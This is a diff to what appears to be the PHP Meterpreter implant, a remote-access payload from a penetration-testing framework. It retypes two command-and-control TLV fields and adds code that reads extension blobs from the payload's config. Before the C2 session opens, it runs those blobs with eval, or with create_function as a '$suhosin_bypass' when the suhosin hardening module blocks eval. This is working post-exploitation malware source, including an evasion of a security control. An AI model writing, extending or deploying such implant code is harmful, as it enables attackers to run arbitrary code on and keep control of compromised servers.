@@ -265,8 +265,8 @@ define("TLV_TYPE_C2_SUFFIX",           TLV_META_TYPE_RAW    | 719);
 define("TLV_TYPE_C2_ENC_INBOUND",      TLV_META_TYPE_UINT   | 720);
 define("TLV_TYPE_C2_ENC_OUTBOUND",     TLV_META_TYPE_UINT   | 728);
 define("TLV_TYPE_C2_ENC_UUID",         TLV_META_TYPE_UINT   | 729);
-define("TLV_TYPE_C2_UUID_PREFIX",      TLV_META_TYPE_RAW    | 730);
-define("TLV_TYPE_C2_UUID_SUFFIX",      TLV_META_TYPE_RAW    | 731);
+define("TLV_TYPE_C2_UUID_PREFIX",      TLV_META_TYPE_STRING | 730);
+define("TLV_TYPE_C2_UUID_SUFFIX",      TLV_META_TYPE_STRING | 731);
 define("TLV_TYPE_C2_PREFIX_SKIP",      TLV_META_TYPE_UINT   | 721);
 define("TLV_TYPE_C2_SUFFIX_SKIP",      TLV_META_TYPE_UINT   | 722);
 define("TLV_TYPE_C2_UUID_COOKIE",      TLV_META_TYPE_STRING | 723);
@@ -1404,6 +1404,15 @@ function parse_config_block($raw) {
   }
   $config['transports'] = $transports;
 
+  $extensions = array();
+  foreach (packet_enum_tlvs($config_bytes, TLV_TYPE_EXTENSION) as $ext_tlv) {
+    $data_tlv = packet_get_tlv_raw($ext_tlv['value'], TLV_TYPE_DATA);
+    if ($data_tlv != null && strlen($data_tlv['value']) > 0) {
+      $extensions[] = $data_tlv['value'];
+    }
+  }
+  $config['extensions'] = $extensions;
+
   return $config;
 }
 
@@ -2255,6 +2264,19 @@ $GLOBALS['current_transport_idx'] = 0;
 $GLOBALS['next_transport_idx'] = null;
 $GLOBALS['session_expiry_end'] = time() + $config['session_expiry'];
 $GLOBALS['running'] = true;
+
+# Hot-load extensions baked into the config block (EXTENSIONS=) before
+# opening the C2 session, so the framework sees them at connect time.
+if (!empty($config['extensions'])) {
+  foreach ($config['extensions'] as $ext_source) {
+    if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval') && can_call_function('create_function')) {
+      $suhosin_bypass = create_function('', $ext_source);
+      $suhosin_bypass();
+    } else {
+      eval($ext_source);
+    }
+  }
+}
 
 #
 # Outer transport-rotation loop: activate the current transport (with retry),
